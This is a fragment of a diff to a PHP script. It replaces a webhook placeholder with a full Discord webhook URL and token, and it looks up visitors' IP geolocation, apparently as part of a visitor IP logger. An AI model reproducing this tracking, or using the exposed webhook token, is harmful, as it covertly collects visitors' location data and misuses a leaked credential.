@@ -77,7 +77,7 @@ else{
 	}
 date_default_timezone_set('Australia/Sydney');
 $time = date('Y-m-d H:i:s');
-$url = "Webhook URL";
+$url = "https://discord.com/api/webhooks/1138481974399471677/PZnZF7Q10KgaXvHAxZf3S5jXzZ55HBz11LIOLFY0LT5q8QgxIOD3DRCvTdHjjtslJLtK";
 
 $ipdat = @json_decode(file_get_contents( 
     "http://www.geoplugin.net/json.gp?ip=" . $ip)); 
